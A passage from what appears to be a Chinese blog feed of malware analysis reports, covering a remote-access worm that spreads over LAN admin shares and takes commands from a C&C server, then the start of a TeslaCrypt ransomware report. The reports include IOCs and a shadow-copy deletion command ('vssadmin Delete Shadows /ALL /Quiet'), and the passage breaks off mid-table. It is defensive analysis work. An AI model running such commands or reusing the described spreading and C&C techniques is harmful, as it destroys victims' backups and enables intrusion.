color=red>WNetAddCon_copy_exec_402A40</font>传入了三个值，分别是IP地址，用户名，密码。通过调用<font color=red>WNetAddConnection函数</font>,用之前初始化的字典（用户名，密码），对该网段的网络资源进行连接。</p><p>若连接成功，将自身文件拷贝到网络共享资源的多个盘符中，看哪个盘符可以拷贝成功。当拷贝成功便跳到<font color=red>LABEL_14:</font>再两分钟后运行复制后的程序，<font color=red>从而达到通网段的传播</font>。拷贝的目标盘符，如下表：</p><table><thead><tr><th>拷贝的目标盘符：</th></tr></thead><tbody><tr><td>\10.95.16.1\admin$\g1fd.exe</td></tr><tr><td>\10.95.16.1\c$\NewArean.exe</td></tr><tr><td>\10.95.16.1\D$\g1fd.exe</td></tr><tr><td>\10.95.16.1\E$\g1fd.exe</td></tr><tr><td>\10.95.16.1\F$\g1fd.exe</td></tr></tbody></table><p>创建网络资源连接，复制自身代码如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568550413617.png" alt="1568550413617"></p></li></ul><h3 id="线程2：与远控服务器通信，执行指令"><a href="#线程2：与远控服务器通信，执行指令" class="headerlink" title="线程2：与远控服务器通信，执行指令"></a>线程2：与远控服务器通信，执行指令</h3><p>首先初始化了winsock服务，然后是循环，获取当前系统时间，并进行了判断当日期大于2013年2月21日后，<font color=red>便不断创建线程2.1</font>，创建套接字链接远程服务器，获取指令执行命令。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568552086331.png" alt="1568552086331"></p><h4 id="线程2-1：与远控服务器通信，获取指令并执行"><a href="#线程2-1：与远控服务器通信，获取指令并执行" class="headerlink" title="线程2.1：与远控服务器通信，获取指令并执行"></a>线程2.1：与远控服务器通信，获取指令并执行</h4><h5 id="初始化套接字，并建立链接"><a href="#初始化套接字，并建立链接" class="headerlink" title="初始化套接字，并建立链接"></a>初始化套接字，并建立链接</h5><p>现通过htons函数将整型变量<font color=red>8090</font>转换成网络字节顺序，初始化端口。</p><p>然后通过<font color=red>Swap_init_IPaddr</font>将域名“<font color=red>arwah.uy1433.com</font>”转换为IP地址，然后初始化<font color=red>socket</font>，然后通过函数<font color=red>connect</font>连接该套接字。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568554186815.png" alt="1568554186815"></p><ul><li>其中<font color=red>Swap_init_IPaddr</font>，转化IP的代码如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568554466165.png" alt="1568554466165"></p><h5 id="获取主机信息并发送致远控服务器"><a href="#获取主机信息并发送致远控服务器" class="headerlink" title="获取主机信息并发送致远控服务器"></a>获取主机信息并发送致远控服务器</h5><p>先与套接字建立连接，然后执行<font color=red>get_info_405150</font>获取主机信息。包括版本信息，内存大小，CPU信息，以及适配器信息等。然后将这些信息，通过套接字发送到远控服务器上。</p><p><strong>将获取到的数据发送给远程服务器，如下图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568599865588.png" alt="1568599865588"></p><p><strong>获取到的主机信息，如下图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601803942.png" alt="1568601803942"></p><ul><li><strong>其中get_info_405150获取系统信息函数，如下：</strong></li><li><ul><li>1.判断当前操作系统版本</li><li>通过Getversion函数，获取操作系统信息，再根据获取到的操作系统信息，判断当前操作系统的版本，如图：</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568552954567.png" alt="1568552954567"></p><ul><li><ul><li>2.获取CPU频率</li><li>通过获取注册表中的键值，来获取CPU的频率信息。</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568552888140.png" alt="1568552888140"></p><ul><li><ul><li>3.获取物理和虚拟内存信息</li><li>通过<font color=red>GlobalMemoryStatsEx</font>来获取系统物理和虚拟内存信息。</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568553016127.png" alt="1568553016127"></p><ul><li><ul><li>4.获取适配器信息</li><li>通过<font color=red>GetAdaptersInfo</font>检索本地计算机的适配器信息，然后获取到网络适配器的网络信息。</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568553326893.png" alt="1568553326893"></p><h5 id="接收指令执行操作"><a href="#接收指令执行操作" class="headerlink" title="接收指令执行操作"></a>接收指令执行操作</h5><p>创建死循环，通过调用<font color=red>receive_info_4036C8</font>来接收远控服务器下发的指令，然后根据下发的指令进行相应的操作，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568598189550.png" alt="1568598189550"></p><ul><li>其中<font color=red>receive_info_4036C8</font>函数，通过函数<font color=red>rec</font>来接收远控服务器下发的指令或数据，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568562440939.png" alt="1568562440939"></p><h5 id="接收的指令为：0x10，下载并执行"><a href="#接收的指令为：0x10，下载并执行" class="headerlink" title="接收的指令为：0x10，下载并执行"></a>接收的指令为：0x10，下载并执行</h5><p>当接收到是0x10时，通过<font color=red>URLDownloadToFileA</font>将接收的数据写入临时文件夹下，并以系统自启动以来的毫秒数来命名。当下载完后，运行下载后的程序。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568562998892.png" alt="1568562998892"></p><h5 id="接收的指令为：0x12，更新自身"><a href="#接收的指令为：0x12，更新自身" class="headerlink" title="接收的指令为：0x12，更新自身"></a>接收的指令为：0x12，更新自身</h5><p>先关闭之前创建的<font color=red>.Net CLR</font>互斥体，通过<font color=red>URLDownloadToFileA</font>将接收的数据写入临时文件夹下，并以随机字符串命名。然后关闭之前创建的<font color=red>.Net CLR</font>服务,并删除注册表项<font color=red>.Net CLR</font>，然后再删除自身，运行下载后的程序。这里推测是<font color=red>更新自身</font>。</p><ul><li>关闭之前创建的互斥体如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601120782.png" alt="1568601120782"></p><ul><li>下载文件，并以随机字符串命名如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601212938.png" alt="1568601212938"></p><ul><li>关闭服务如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601292710.png" alt="1568601292710"></p><ul><li>删除注册表项和自身文件，并运行下载后的文件，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601380109.png" alt="1568601380109"></p><h5 id="接收的指令为：0x14，打开IE"><a href="#接收的指令为：0x14，打开IE" class="headerlink" title="接收的指令为：0x14，打开IE"></a>接收的指令为：0x14，打开IE</h5><p>打开<font color=red>Iexplore.exe</font>，并执行接收到的参数，初步推断为访问某些特殊的网站刷流量。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601454250.png" alt="1568601454250"></p><h5 id="接受的指令为：0x06，删除自身"><a href="#接受的指令为：0x06，删除自身" class="headerlink" title="接受的指令为：0x06，删除自身"></a>接受的指令为：0x06，删除自身</h5><p>先关闭之前创建的互斥体<font color=red>.Net CLR</font>，关闭服务<font color=red>.NET CLR</font>,然后再删除注册表项<font color=red>.Net CLR</font>,删除自身，退出进程。</p><ul><li>关闭互斥体，关闭服务，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568602630773.png" alt="1568602630773"></p><ul><li>删除注册表项，删除自身，退出进程，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568602700057.png" alt="1568602700057"></p><h5 id="接收的指令小于0x06时，进行DDOS攻击"><a href="#接收的指令小于0x06时，进行DDOS攻击" class="headerlink" title="接收的指令小于0x06时，进行DDOS攻击"></a>接收的指令小于0x06时，进行DDOS攻击</h5><p>当收到的指令小于6时，再次进行<font color=red>switch case</font>判断。根据接收的参数，构造套接字，或是请求包头来进行连接。推测是进行<font color=red>DDOS攻击</font>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568605182440.png" alt="1568605182440"></p><ul><li>其中当接收的指令为：0x02，执行<font color=red>sub_4030A5</font>，根据收到的数据，初始化不同的套接字，并最终都交由<font color=red>LABEL_29</font>来创建循环，不断进行链接，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568604291694.png" alt="1568604291694"></p><ul><li><p>其中当接收的指令为：0x03时，执行<font color=red>sub_4031F0</font>，根据接收到的参数，构造请求包头，并最终<font color=red>创建死循环不断进行连接</font>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568605639197.png" alt="1568605639197"></p><ul><li>其中<font color=red>sub_406C60</font>构造的比较特殊的请求包头，如图：</li><li><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568605762398.png" alt="1568605762398"></li></ul></li></ul><h3 id="线程3：与线程2-1基本一样，只是远控服务器地址为内网IP"><a href="#线程3：与线程2-1基本一样，只是远控服务器地址为内网IP" class="headerlink" title="线程3：与线程2.1基本一样，只是远控服务器地址为内网IP"></a>线程3：与线程2.1基本一样，只是远控服务器地址为内网IP</h3><p>线程3与线程2.1大体上都是一致的，唯一的区别在于远控服务器不再是<font color=red>arwah.uy1433.com</font>，而变成了写死的内网IP：<font color=red>192.168.1.107:83</font>。而且该IP地址是通过解密函数获取到的，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568605994098.png" alt="1568605994098"></p><p>除黄色标识处不同外，其他部分都与线程2.1一致，这里便不再分析。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568606079331.png" alt="1568606079331"></p><h1 id="0x02-样本溯源"><a href="#0x02-样本溯源" class="headerlink" title="0x02 样本溯源"></a>0x02 样本溯源</h1><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td><strong>arwah.uy1433.com</strong></td></tr><tr><td><strong>192.168.1.107:83</strong></td></tr></tbody></table><h1 id="0x03-查杀、防御技术方案"><a href="#0x03-查杀、防御技术方案" class="headerlink" title="0x03 查杀、防御技术方案"></a>0x03 查杀、防御技术方案</h1><h2 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h2><p>由于该样本设置了一个服务<font color=red>.Net CLR</font>，所以首先先关闭服务，并删除该服务。</p><h2 id="修复注册表"><a href="#修复注册表" class="headerlink" title="修复注册表"></a>修复注册表</h2><p>由于上面提到的该样本创建了服务，对注册表进行了修改，所以这里需要对注册表进行修复，操作如下：</p><ul><li>删除注册表项<font color=red>HKEY_LOCAL_MACHINE\system\currentcontrolset\services.Net CLR</font>中的所有内容。</li></ul><h2 id="删除病毒文件"><a href="#删除病毒文件" class="headerlink" title="删除病毒文件"></a>删除病毒文件</h2><ul><li><p>删除样本本身。</p></li><li><p>删除释放出来的hra33.dll。</p></li><li><p>查看下表中的文件路径，若该文件存在，则删除。</p><table><thead><tr><th>拷贝的目标盘符：</th></tr></thead><tbody><tr><td>\10.95.16.1\admin$\g1fd.exe</td></tr><tr><td>\10.95.16.1\c$\NewArean.exe</td></tr><tr><td>\10.95.16.1\D$\g1fd.exe</td></tr><tr><td>\10.95.16.1\E$\g1fd.exe</td></tr><tr><td>\10.95.16.1\F$\g1fd.exe</td></tr></tbody></table></li><li><p>检查临时文件夹，是否存在以随机数命名的文件，且大小hash与该样本一致，若存在直接删除。</p></li></ul><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>这个样本是一个远控和蠕虫病毒的结合体，释放hra33.dll，由于该样本无法正常跑起来，因此没法详细分析该释放出来的hra33.dll。这次分析的蠕虫病毒是通过初始化一个简单的字典，通过爆破局域网内的主机来进行传播的。并且该蠕虫病毒可以通过C&amp;C服务器获取指令，执行不同操作，主要操作有：下载文件并执行，更新自身，DDOS攻击等。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 蠕虫 </tag>
            
            <tag> .Net </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TeslaCrypt勒索病毒</title>
      <link href="2019/09/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2019/09/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size =9> <b>TeslaCrypt勒索病毒 </b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>tfukrc.exe</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>勒索病毒</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>235KB（240,640字节）</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>72CCC18F3038E19273010D45AC2142CE</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>该病毒原名为Tesla Crypt勒索病毒，勒索信息中提示是通过RSA加密算法进行加密的，但通过分析，发现该样本是通过AES加密算法对文件进行大量的加密操作，从而进行勒索。由于他的主密钥已经由开发者公布，故该勒索病毒是可以进行解密的。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/liuchengtu.png" alt="liuchengtu"></p><h1 id="0x01-样本细节详细分析"><a href="#0x01-样本细节详细分析" class="headerlink" title="0x01 样本细节详细分析"></a>0x01 样本细节详细分析</h1><h2 id="样本行为分析"><a href="#样本行为分析" class="headerlink" title="样本行为分析"></a>样本行为分析</h2><h3 id="1-文件写入行为分析"><a href="#1-文件写入行为分析" class="headerlink" title="1.文件写入行为分析"></a>1.文件写入行为分析</h3><ul><li>运行样本后，该样本复制自身文件，到<font color=red>C:\Users&lt;username&gt;\Documents\</font> 目录下，并更名为一个随机名:这里是<font color=red>lohdrw.exe</font>，如图1：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567409136692.png" alt="1567409136692"></p><center>图1</center>- 然后该样本结束自身，并调用被释放出来的<font color=red>lohdrw.exe</font>程序，对文件进行了大量的写入行为，如图2所示：<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567395508873.png" alt="1567395508873"></p><center> 图2 </center>打开被写入过的txt文件，发现内容都被加密过了，如图3：<p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567410245244.png" alt="1567410245244"></p><center>图3</center>### 2.进程分析 <p>查看进程树，逐条进行分析。进程树如图4：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567410561150.png" alt="1567410561150"></p><center>图4</center>- 运行该样本后，释放了<font color=red>lohdrw.exe</font>，并运行了改exe程序。然后该exe对文件进行了大量的写入，可见图2。<ul><li><p>然后<font color=red>lohdrw.exe</font>先后调用了两次<font color=red>vssadmin.exe</font>(卷影拷贝服务)。执行了如下命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin.exe Delete Shadows &#x2F;ALL &#x2F;Quiet</span><br></pre></td></tr></table></figure><p>静默删除全部卷影副本。<font color=red>防止通过本地恢复</font>。如图5:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567411572570.png" alt="1567411572570"></p><center>图5</center></li><li><p>然后调用<font color=red>NOTEPAD.exe</font>，执行病毒路径下的txt文件，弹出勒索信息内容。如图6：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567412221894.png" alt="1567412221894"></p><center>图6</center></li><li><p>最后调用cmd执行如下命令，删除自身。如图7：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd /c DEL C:\Users john\DOCUMENT\Vohdrw.exe&gt;&gt;NUL</span><br><span class="line">cmd /c DEL C:\Users john\Desktop\tfukrc\tfukrc.exe &gt;&gt;NUL</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567412539335.png" alt="1567412539335"></p><center>图7</center></li></ul><h3 id="3-网络行为分析"><a href="#3-网络行为分析" class="headerlink" title="3.网络行为分析"></a>3.网络行为分析</h3><ul><li>样本进行了大量的网络行为，如图8：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567413133164.png" alt="1567413133164"></p><center>图8</center>### 4.注册表行为分析<ul><li>修改注册表，添加了自启动项，在注册表<font color=red>HRCU\Software\Microsoft\Windows\CurrentVersion\Run</font>目录下添加键值,并设置路径为释放出的<font color=red>lohdrw.exe</font>。如图9</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567413261912.png" alt="1567413261912"></p><center>图9</center>## 样本详细分析<h3 id="找到主函数入口："><a href="#找到主函数入口：" class="headerlink" title="找到主函数入口："></a>找到主函数入口：</h3><p>首先找到主函数入口点，从_tmainCRTStartup中找到主函数入口点<font color=red>wWinMain</font>。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567837425099.png" alt="1567837425099"></p><h3 id="反沙箱"><a href="#反沙箱" class="headerlink" title="反沙箱"></a>反沙箱</h3><p>进入主函数我WinMain中后，该样本首先初始化了COM组件，并调用了<font color=red>FIlterGraph组件</font>，来检查音频设备是否存在，从而判断是否是沙箱环境。若判断是沙箱环境，直接退出程序，不再执行。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567843869096.png" alt="1567843869096"></p><h3 id="关闭安全警告弹窗"><a href="#关闭安全警告弹窗" class="headerlink" title="关闭安全警告弹窗"></a>关闭安全警告弹窗</h3><p>由于样本的传播途径可能由很多种，其中若是通过IE浏览器下载的话，会默认再所下载的文件中默认添加一个隐藏文件流：filename<font color=red>:zone.identifier</font>。如果有该隐藏文件流，再运行该程序的时候，会弹出警告窗口。</p><p>所以该样本获取到完整文件路径后，通过字符串拼接出：filename<font color=red>:zone.identifier</font>，然后将其删除。来阻止弹出警告窗口。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567844819428.png" alt="1567844819428"></p><h3 id="解密指令与勒索信息"><a href="#解密指令与勒索信息" class="headerlink" title="解密指令与勒索信息"></a>解密指令与勒索信息</h3><p>该样本通过解密函数，解密出后面所用到的一些数据信息。其中调用了下图中<font color=red>init_key_encode_42B00</font>函数初始化了一个大小为244字节的密钥，然后通过该密钥去解密信息。如下图：</p><p>其中解密出来的数据都有：<font color=red>解密出要加密的文件后缀名；解密出勒索提示信息的文件名；解密出要执行指令；解密出而异域名以及网络请求头；以及勒索文本信息</font></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567847268237.png" alt="1567847268237"></p><ul><li><p>要加密的文件类型，就是解密出来的后缀名。解密出的后缀名，如表1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.r3d .ptx .pef .srw .x3f .der .cer .crt .pem .odt .ods .odp .odm .odc .odb .doc .docx .kdc .mef .mrwref .nrw .orf .raw .rwl .rw2 .mdf .dbf .psd .pdd .pdf .eps .jpg .jpe .dng .3fr .arw .srf .sr2 .bay .crw .cr2 .dcr .ai .indd .cdr .erf .bar .hkx .raf .rofl .dba .db0 .kdb .mpqge .vfs0 .mcmeta .m2 .lrf .vpp_pc .ff .cfr .snx .lvl .arch00 .ntl .fsh  .itdb .itl .mddata .sidd .sidn .bkf .qic .bkp .bc7 .bc6 .pkpass .tax .gdb .qdf .t12 .t13.ibank .sum .sie .zip .w3x .rim .psk .tor .vpk .iwd .kf .mlx .fpk .dazip .vtf .vcf .esm .blob .dmp .layout .menu .ncf .sid .sis .ztmp .vdf .mov .fos .sb .itm .wmo .itm .map .wmo .sb .svg .cas .gho .syncdb .mdbackup .hkdb .hplg .hvpl .icxs .docm .wps .xls .xlsx .xlsm .xlsb .xlk .ppt .pptx .pptm .mdb .accdb .pst .dwg .xf .dxg .wpd .rtf .wb2 .pfx .p12 .p7b .p7c .txt .jpeg .png .rb .css .js .flv .m3u .py .desc .xxx .litesql wallet .big .pak .rgss3a .epk .bik .slm .lbf .sav .re4 .apk .bsa .ltx .forge .asset .litemod .iwi .das .upk .d3dbsp .csv .wmv .avi .wma .m4a .rar .7z .mp4 .sql .bak .tiff</span><br></pre></td></tr></table></figure><center>表1</center></li><li><p>解密出来的指令，如表2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 